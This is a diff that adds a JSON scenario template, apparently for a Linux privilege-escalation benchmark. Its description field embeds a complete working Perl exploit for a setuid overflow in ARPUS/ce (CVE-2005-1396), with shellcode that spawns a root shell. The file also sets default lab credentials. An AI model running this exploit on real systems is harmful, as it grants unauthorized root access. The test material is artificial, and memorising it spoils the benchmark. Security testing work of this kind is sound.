@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_974",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: ARPUS/Ce - Local Overflow (setuid) (OSVDB-16050;CVE-2005-1396)\n\nExploit source code (974.pl):\n```\n#!/usr/bin/perl -w\n#\n# Setuid ARPUS/ce exploit by KF - kf_lists[at]digitalmunition[dot]com - 4/21/05\n#\n# Copyright Kevin Finisterre\n# kfinisterre@threat:/tmp$ ./ce_ex.pl\n# sh-2.05b# id\n# uid=0(root) gid=1000(kfinisterre)\n# groups=20(dialout),24(cdrom),25(floppy),29(audio),44(video),1000(kfinisterre)\n#\n\n# 57 bytes long\n$sc  = \"\\x90\"x512;\n$sc .= \"\\x31\\xd2\\x31\\xc9\\x31\\xdb\\x31\\xc0\\xb0\\xa4\\xcd\\x80\";\n$sc .= \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\";\n$sc .= \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\";\n$sc .= \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\";\n\n$buf = \"\\x90\" x (4120-569);\n$buf .= $sc;\n$buf .= (pack(\"l\",(0xbfffa187)) x2);\n\n$ENV{\"XAPPLRESLANGPATH\"} = $buf;\n\nexec(\"/usr/bin/ce\");\n\n\n# milw0rm.com [2005-05-01]\n```",
+  "cve": "OSVDB-16050;CVE-2005-1396",
+  "exploitdb_id": "974",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_974",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
